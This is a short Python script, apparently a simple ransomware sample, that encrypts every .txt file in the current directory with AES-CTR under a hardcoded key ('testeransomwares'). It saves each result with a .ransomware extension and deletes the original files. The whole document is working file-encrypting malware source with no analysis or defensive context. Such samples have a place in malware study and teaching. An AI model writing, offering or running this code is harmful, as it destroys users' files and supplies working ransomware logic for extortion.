import os
import pyaes

path = os.getcwd()
files_name = [f for f in os.listdir(path) if f.endswith('.txt')]
key = b"testeransomwares"
for file_name in files_name:
    with open(file_name, 'rb') as file:
        file_data = file.read()
        
    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(file_data)

    new_file = file_name + '.ransomware'
    with open(new_file, 'wb') as file:
        file.write(crypto_data)
    os.remove(file_name)
    